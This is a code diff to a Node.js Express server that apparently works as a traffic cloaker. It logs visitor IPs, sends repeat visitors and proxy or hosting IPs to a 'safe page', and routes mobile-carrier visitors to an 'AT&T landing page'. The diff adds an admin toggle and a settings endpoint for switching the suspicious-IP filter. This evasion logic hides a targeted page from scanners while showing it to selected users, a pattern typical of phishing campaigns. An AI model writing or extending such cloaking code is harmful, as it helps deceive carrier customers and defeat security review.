@@ -18,6 +18,7 @@ app.set('trust proxy', 1);
 // Path to store visited IPs
 const VISITED_IPS_FILE = path.join(__dirname, 'visited_ips.json');
 const FORCED_IPS_FILE = path.join(__dirname, 'forced_ips.json');
+const SETTINGS_FILE = path.join(__dirname, 'settings.json');
 
 // Ensure the files exist
 if (!fssync.existsSync(VISITED_IPS_FILE)) {
@@ -25,6 +26,9 @@ if (!fssync.existsSync(VISITED_IPS_FILE)) {
 }
 if (!fssync.existsSync(FORCED_IPS_FILE)) {
     fssync.writeFileSync(FORCED_IPS_FILE, JSON.stringify([]));
+}
+if (!fssync.existsSync(SETTINGS_FILE)) {
+    fssync.writeFileSync(SETTINGS_FILE, JSON.stringify({ isSuspiciousEnabled: true }));
 }
 
 async function getVisitedIps() {
@@ -91,6 +95,22 @@ async function removeForcedIp(ip) {
     const ips = await getForcedIps();
     const newIps = ips.filter(i => i !== ip);
     await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(newIps, null, 2));
+}
+
+async function getSettings() {
+    try {
+        const data = await fs.readFile(SETTINGS_FILE, 'utf8');
+        return JSON.parse(data);
+    } catch (e) {
+        return { isSuspiciousEnabled: true };
+    }
+}
+
+async function updateSettings(newSettings) {
+    const settings = await getSettings();
+    const updated = { ...settings, ...newSettings };
+    await fs.writeFile(SETTINGS_FILE, JSON.stringify(updated, null, 2));
+    return updated;
 }
 
 function escapeHtml(str) {
@@ -191,6 +211,9 @@ app.get('/init', async (req, res) => {
 
     console.log(`[Init] Visit from IP: ${clientIp}`);
     
+    // Fetch settings
+    const settings = await getSettings();
+
     // Check for forced redirect IPs
     const forcedIps = await getForcedIps();
     const isForced = forcedIps.includes(clientIp);
@@ -253,18 +276,22 @@ app.get('/init', async (req, res) => {
         if (isVisited) {
             console.log(`[Init] IP ${clientIp} already visited. Redirecting to safe page.`);
             targetUrl = NON_ATT_LANDING_PAGE;
-        } else if (data && data.status === 'success' && !isSuspicious) {
-            const userISP = (data.isp || data.org || "").toUpperCase();
-            if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
-                console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
-                targetUrl = '/go-att';
-            } else {
-                console.log(`[Init] No ISP match for: ${userISP}`);
-            }
-        } else if (isSuspicious) {
-            console.log(`[Init] Suspicious IP detected. Redirecting to safe page.`);
         } else {
-            console.log(`[Init] Redirecting to safe page. Status: ${data?.status}`);
+            const isSuspiciousMatch = isSuspicious && settings.isSuspiciousEnabled;
+            
+            if (data && data.status === 'success' && !isSuspiciousMatch) {
+                const userISP = (data.isp || data.org || "").toUpperCase();
+                if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
+                    console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
+                    targetUrl = '/go-att';
+                } else {
+                    console.log(`[Init] No ISP match for: ${userISP}`);
+                }
+            } else if (isSuspiciousMatch) {
+                console.log(`[Init] Suspicious IP detected and filter is ENABLED. Redirecting to safe page.`);
+            } else {
+                console.log(`[Init] Redirecting to safe page. Status: ${data?.status}`);
+            }
         }
     }
 
@@ -275,6 +302,7 @@ app.get('/init', async (req, res) => {
 app.get('/admin', requireAdmin, async (req, res) => {
     const ips = await getVisitedIps();
     const forcedIps = await getForcedIps();
+    const settings = await getSettings();
     let html = `
         <!DOCTYPE html>
         <html>
@@ -290,15 +318,36 @@ app.get('/admin', requireAdmin, async (req, res) => {
                 .remove-btn { color: #d9534f; cursor: pointer; font-weight: bold; }
                 .remove-btn:hover { text-decoration: underline; }
                 .add-section { margin-top: 20px; display: flex; gap: 10px; }
-                input { padding: 8px; border: 1px solid #ddd; border-radius: 4px; flex-grow: 1; }
+                input[type="text"] { padding: 8px; border: 1px solid #ddd; border-radius: 4px; flex-grow: 1; }
                 button { padding: 8px 16px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
                 button:hover { background: #0056b3; }
                 .status { color: #666; font-size: 0.9em; }
+                .toggle-container { display: flex; align-items: center; gap: 10px; margin-top: 10px; }
+                /* Simple Toggle Switch CSS */
+                .switch { position: relative; display: inline-block; width: 60px; height: 34px; }
+                .switch input { opacity: 0; width: 0; height: 0; }
+                .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
+                .slider:before { position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+                input:checked + .slider { background-color: #2196F3; }
+                input:focus + .slider { box-shadow: 0 0 1px #2196F3; }
+                input:checked + .slider:before { transform: translateX(26px); }
             </style>
         </head>
         <body>
             <div class="container">
                 <h1>Admin Panel</h1>
+
+                <section>
+                    <h2>General Settings</h2>
+                    <div class="toggle-container">
+                        <span>Enable "isSuspicious" Filter:</span>
+                        <label class="switch">
+                            <input type="checkbox" id="isSuspiciousToggle" ${settings.isSuspiciousEnabled ? 'checked' : ''}>
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <p class="status">If disabled, visits flagged as proxies/hosting will NOT be automatically blocked (unless they fail ISP check).</p>
+                </section>
 
                 <section>
                     <h2>Forced Redirect IPs</h2>
@@ -357,6 +406,19 @@ app.get('/admin', requireAdmin, async (req, res) => {
 
             <script>
                 const getAdminToken = () => new URLSearchParams(window.location.search).get('token');
+
+                document.getElementById('isSuspiciousToggle').addEventListener('change', async (e) => {
+                    const isEnabled = e.target.checked;
+                    const response = await fetch('/api/admin/settings/update', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-admin-token': getAdminToken() },
+                        body: JSON.stringify({ isSuspiciousEnabled: isEnabled })
+                    });
+                    if (!response.ok) {
+                        alert('Failed to update setting');
+                        e.target.checked = !isEnabled;
+                    }
+                });
 
                 document.getElementById('addForcedBtn').addEventListener('click', async () => {
                     const ip = document.getElementById('forcedIpInput').value.trim();
@@ -432,6 +494,14 @@ app.post('/api/admin/forced/remove', requireAdmin, async (req, res) => {
     if (!ip) return res.status(400).send('IP is required');
     await removeForcedIp(ip);
     res.status(200).send('IP removed from forced list');
+});
+
+// Endpoint to update general settings
+app.post('/api/admin/settings/update', requireAdmin, async (req, res) => {
+    const { isSuspiciousEnabled } = req.body;
+    if (typeof isSuspiciousEnabled !== 'boolean') return res.status(400).send('Invalid setting value');
+    await updateSettings({ isSuspiciousEnabled });
+    res.status(200).send('Settings updated');
 });
 
 // Redirect to AT&T landing page
